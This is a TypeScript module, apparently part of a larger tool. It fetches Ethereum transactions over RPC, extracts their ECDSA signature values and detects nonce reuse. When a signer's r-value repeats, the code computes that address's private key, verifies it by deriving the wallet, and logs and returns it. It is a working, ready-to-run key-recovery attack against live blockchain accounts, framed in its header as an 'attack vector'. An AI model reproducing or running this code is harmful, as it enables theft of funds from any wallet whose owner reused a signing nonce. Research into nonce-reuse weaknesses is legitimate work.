/**
 * TX Hash ECDSA Extraction Engine  (Engine 0)
 * ═══════════════════════════════════════════════
 *
 * Fetches Ethereum transactions by hash, recovers ECDSA (r, s, z) from each,
 * groups signatures by the sending address, and detects nonce-reuse (shared r)
 * which allows direct private-key recovery with no block scanning at all.
 *
 * Attack vector:
 *   If two txs from the same address share the same r-value then:
 *     k  = (z1 − z2) / (s1 − s2) mod n
 *     priv = (s1·k − z1) · r⁻¹ mod n
 *
 * This is the highest-signal engine for datasets of known-attacker tx hashes.
 */

import { ethers } from "ethers";
import { logger  } from "../logger";

// ── secp256k1 curve order ────────────────────────────────────────────────────
const N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");

function modInv(a: bigint, m: bigint): bigint {
  let [old_r, r] = [a, m];
  let [old_s, s] = [1n, 0n];
  while (r !== 0n) {
    const q = old_r / r;
    [old_r, r] = [r, old_r - q * r];
    [old_s, s] = [s, old_s - q * s];
  }
  return ((old_s % m) + m) % m;
}

function mod(a: bigint, m: bigint): bigint {
  return ((a % m) + m) % m;
}

// ── Types ────────────────────────────────────────────────────────────────────

export interface TxSigRecord {
  txHash:  string;
  address: string;   // recovered signer (lowercased)
  r:       string;   // 0x-prefixed 32-byte hex
  s:       string;
  z:       string;   // unsignedHash = signing preimage hash
  nonce:   number;
  blockNumber: number;
}

export interface TxHashFinding {
  attackType:    string;
  address:       string;
  txHash1:       string;
  txHash2?:      string;
  sharedR?:      string;
  recoveredPrivKey?: string;
  detail:        string;
  confidence:    number;
  discoveredAt:  string;
}

export interface TxHashBatchResult {
  processed:  number;
  fetched:    number;
  failed:     number;
  findings:   TxHashFinding[];
  newRecords: TxSigRecord[];
}

// ── In-memory cross-tx signature registry ────────────────────────────────────
// Persists across multiple calls so nonce-reuse detection spans the full dataset.

const _addrSigs = new Map<string, TxSigRecord[]>();   // address → [TxSigRecord]
const _rIndex   = new Map<string, TxSigRecord[]>();   // r-value → [TxSigRecord]

export function resetTxRegistry(): void {
  _addrSigs.clear();
  _rIndex.clear();
}

export function txRegistrySize(): { addresses: number; rValues: number; totalSigs: number } {
  let totalSigs = 0;
  for (const recs of _addrSigs.values()) totalSigs += recs.length;
  return { addresses: _addrSigs.size, rValues: _rIndex.size, totalSigs };
}

// ── Core: fetch + parse one transaction ──────────────────────────────────────

async function fetchTxSig(
  provider: ethers.JsonRpcProvider,
  txHash:   string,
): Promise<TxSigRecord | null> {
  try {
    // eth_getTransactionByHash returns the tx with r, s, v fields
    const raw = await provider.send("eth_getTransactionByHash", [txHash]) as Record<string, string> | null;
    if (!raw || !raw.r || !raw.s) return null;

    // Reconstruct the transaction to compute the unsigned hash (signing preimage z)
    const type = raw.type ? parseInt(raw.type, 16) : 0;

    let tx: ethers.Transaction;
    try {
      const txObj: ethers.TransactionLike = {
        type,
        to:    raw.to ?? null,
        nonce: parseInt(raw.nonce, 16),
        gasLimit: BigInt(raw.gas),
        value: BigInt(raw.value),
        data:  raw.input ?? "0x",
        chainId: raw.chainId ? BigInt(raw.chainId) : 1n,
        signature: ethers.Signature.from({ r: raw.r, s: raw.s, v: parseInt(raw.v, 16) }),
      };

      if (type === 2) {
        txObj.maxFeePerGas         = BigInt(raw.maxFeePerGas ?? "0");
        txObj.maxPriorityFeePerGas = BigInt(raw.maxPriorityFeePerGas ?? "0");
        txObj.accessList           = raw.accessList as never ?? [];
      } else if (type === 1) {
        txObj.gasPrice   = BigInt(raw.gasPrice ?? "0");
        txObj.accessList = raw.accessList as never ?? [];
      } else {
        txObj.gasPrice = BigInt(raw.gasPrice ?? "0");
      }

      tx = ethers.Transaction.from(txObj);
    } catch {
      // Fallback: try using raw serialized tx if available
      return null;
    }

    const address = (tx.from ?? "").toLowerCase();
    if (!address || address === "0x0000000000000000000000000000000000000000") return null;

    const z = tx.unsignedHash; // keccak256 of the unsigned RLP = signing preimage

    return {
      txHash:      txHash.toLowerCase(),
      address,
      r:           raw.r.toLowerCase(),
      s:           raw.s.toLowerCase(),
      z,
      nonce:       parseInt(raw.nonce, 16),
      blockNumber: raw.blockNumber ? parseInt(raw.blockNumber, 16) : 0,
    };
  } catch (e) {
    logger.warn({ txHash, err: String(e) }, "tx-hash-engine: fetch error");
    return null;
  }
}

// ── Core: nonce-reuse detection & key recovery ────────────────────────────────

function checkForNonceReuse(record: TxSigRecord): TxHashFinding[] {
  const findings: TxHashFinding[] = [];
  const now = new Date().toISOString();

  // 1. Same-address r-collision (classic nonce reuse)
  const addrRecs = _addrSigs.get(record.address) ?? [];
  for (const prev of addrRecs) {
    if (prev.r !== record.r) continue;
    if (prev.txHash === record.txHash) continue;
    if (prev.z === record.z) continue; // same preimage = same tx, skip

    // r is shared between prev and record from the same signer → nonce reuse!
    const detail = `Address ${record.address} reused nonce k: r=${record.r.slice(0, 18)}… in txs ${prev.txHash.slice(0, 14)}… and ${record.txHash.slice(0, 14)}…`;

    let recoveredKey: string | undefined;
    try {
      const r  = BigInt(record.r);
      const s1 = BigInt(prev.r !== record.r ? prev.s : record.s);
      const s2 = BigInt(prev.r !== record.r ? record.s : prev.s);
      const z1 = BigInt(prev.z);
      const z2 = BigInt(record.z);

      const s1v = BigInt(prev.s);
      const s2v = BigInt(record.s);
      const z1v = BigInt(prev.z);
      const z2v = BigInt(record.z);

      const sDiff = mod(s1v - s2v, N);
      const zDiff = mod(z1v - z2v, N);
      if (sDiff !== 0n) {
        const k = mod(zDiff * modInv(sDiff, N), N);
        if (k > 0n && k < N) {
          const priv = mod((s1v * k - z1v) * modInv(r, N), N);
          if (priv > 0n && priv < N) {
            recoveredKey = "0x" + priv.toString(16).padStart(64, "0");
            // Verify: derive address from recovered key
            try {
              const wallet  = new ethers.Wallet(recoveredKey);
              const derived = wallet.address.toLowerCase();
              if (derived !== record.address) {
                recoveredKey = undefined; // bad recovery — skip
              }
            } catch {
              recoveredKey = undefined;
            }
          }
        }
      }
    } catch {}

    findings.push({
      attackType:    recoveredKey ? "nonce_reuse_key_recovered" : "nonce_reuse_detected",
      address:       record.address,
      txHash1:       prev.txHash,
      txHash2:       record.txHash,
      sharedR:       record.r,
      recoveredPrivKey: recoveredKey,
      detail,
      confidence:    recoveredKey ? 1.0 : 0.95,
      discoveredAt:  now,
    });

    if (recoveredKey) {
      logger.info({ address: record.address, key: recoveredKey.slice(0, 18) + "…" }, "TX-Engine: private key recovered from nonce reuse");
    }
  }

  // 2. Cross-address same-r (r-value collision across different signers — very rare, indicates shared k)
  const rRecs = _rIndex.get(record.r) ?? [];
  for (const prev of rRecs) {
    if (prev.address === record.address) continue; // already handled above
    if (prev.txHash === record.txHash) continue;

    findings.push({
      attackType:  "cross_address_r_collision",
      address:     record.address,
      txHash1:     prev.txHash,
      txHash2:     record.txHash,
      sharedR:     record.r,
      detail:      `Two DIFFERENT addresses (${prev.address} and ${record.address}) share the same ECDSA r-value — they used the same k. Both private keys may be at risk.`,
      confidence:  0.98,
      discoveredAt: now,
    });
  }

  return findings;
}

// ── Public: process a batch of tx hashes ─────────────────────────────────────

export async function processTxHashBatch(
  hashes:   string[],
  provider: ethers.JsonRpcProvider,
): Promise<TxHashBatchResult> {
  const findings:   TxHashFinding[] = [];
  const newRecords: TxSigRecord[]   = [];
  let fetched = 0;
  let failed  = 0;

  for (const hash of hashes) {
    const record = await fetchTxSig(provider, hash);
    if (!record) { failed++; continue; }
    fetched++;

    // Check for nonce reuse BEFORE adding to registry
    const newFindings = checkForNonceReuse(record);
    findings.push(...newFindings);

    // Register in both indices
    const addrList = _addrSigs.get(record.address) ?? [];
    addrList.push(record);
    _addrSigs.set(record.address, addrList);

    const rList = _rIndex.get(record.r) ?? [];
    rList.push(record);
    _rIndex.set(record.r, rList);

    newRecords.push(record);
  }

  return { processed: hashes.length, fetched, failed, findings, newRecords };
}

// ── Utility: read tx hashes from a file ──────────────────────────────────────

import fs   from "fs";
import path from "path";

export function loadTxHashesFromFile(filePath: string): string[] {
  try {
    const raw = fs.readFileSync(filePath, "utf8");
    const hashes: string[] = [];
    for (const line of raw.split("\n")) {
      const h = line.trim().toLowerCase();
      if (/^0x[0-9a-f]{64}$/.test(h)) hashes.push(h);
    }
    return hashes;
  } catch {
    return [];
  }
}

export function loadWalletsFromFile(filePath: string): string[] {
  try {
    const raw = fs.readFileSync(filePath, "utf8");
    const addrs: string[] = [];
    for (const line of raw.split("\n")) {
      const a = line.trim().toLowerCase();
      if (/^0x[0-9a-f]{40}$/.test(a)) addrs.push(a);
    }
    return addrs;
  } catch {
    return [];
  }
}

// ── Checkpoint persistence ─────────────────────────────────────────────────────
//
// Two files are saved after each batch:
//   tx-hash-checkpoint.txt  — one processed tx hash per line (append-only)
//   tx-hash-registry.json   — serialised _addrSigs for nonce-reuse across restarts
//
// On startup, the runner reads the checkpoint to skip already-done hashes and
// reloads the registry so cross-tx nonce detection carries over.

/**
 * Load the set of already-processed tx hashes from the checkpoint file.
 * Returns a Set so O(1) lookup when filtering the pending queue.
 */
export function loadProcessedHashes(checkpointPath: string): Set<string> {
  const out = new Set<string>();
  try {
    const raw = fs.readFileSync(checkpointPath, "utf8");
    for (const line of raw.split("\n")) {
      const h = line.trim().toLowerCase();
      if (/^0x[0-9a-f]{64}$/.test(h)) out.add(h);
    }
  } catch {
    // file doesn't exist yet — normal on first run
  }
  return out;
}

/**
 * Append a batch of newly processed tx hashes to the checkpoint file.
 * Append-only so we never re-read the whole file on every save.
 */
export function appendProcessedHashes(checkpointPath: string, hashes: string[]): void {
  if (hashes.length === 0) return;
  try {
    const dir = path.dirname(checkpointPath);
    fs.mkdirSync(dir, { recursive: true });
    fs.appendFileSync(checkpointPath, hashes.join("\n") + "\n", "utf8");
  } catch (e) {
    logger.warn({ err: String(e) }, "tx-hash-engine: checkpoint write failed");
  }
}

/**
 * Serialise the in-memory signature registry to disk.
 * Registry = _addrSigs map: address → [TxSigRecord, ...]
 * We rebuild _rIndex from _addrSigs on load (it's derived data).
 */
export function saveRegistryToFile(registryPath: string): void {
  try {
    const dir = path.dirname(registryPath);
    fs.mkdirSync(dir, { recursive: true });
    const payload = {
      savedAt:  new Date().toISOString(),
      addrSigs: Array.from(_addrSigs.entries()),
    };
    fs.writeFileSync(registryPath, JSON.stringify(payload), "utf8");
  } catch (e) {
    logger.warn({ err: String(e) }, "tx-hash-engine: registry save failed");
  }
}

/**
 * Restore the signature registry from disk.
 * Rebuilds both _addrSigs and _rIndex from the saved data.
 * Returns the number of signatures restored.
 */
export function loadRegistryFromFile(registryPath: string): number {
  try {
    const raw  = fs.readFileSync(registryPath, "utf8");
    const data = JSON.parse(raw) as { addrSigs: [string, TxSigRecord[]][] };
    if (!Array.isArray(data.addrSigs)) return 0;

    _addrSigs.clear();
    _rIndex.clear();

    let count = 0;
    for (const [addr, records] of data.addrSigs) {
      if (!Array.isArray(records)) continue;
      _addrSigs.set(addr, records);
      for (const rec of records) {
        const rList = _rIndex.get(rec.r) ?? [];
        rList.push(rec);
        _rIndex.set(rec.r, rList);
        count++;
      }
    }
    return count;
  } catch {
    return 0;
  }
}
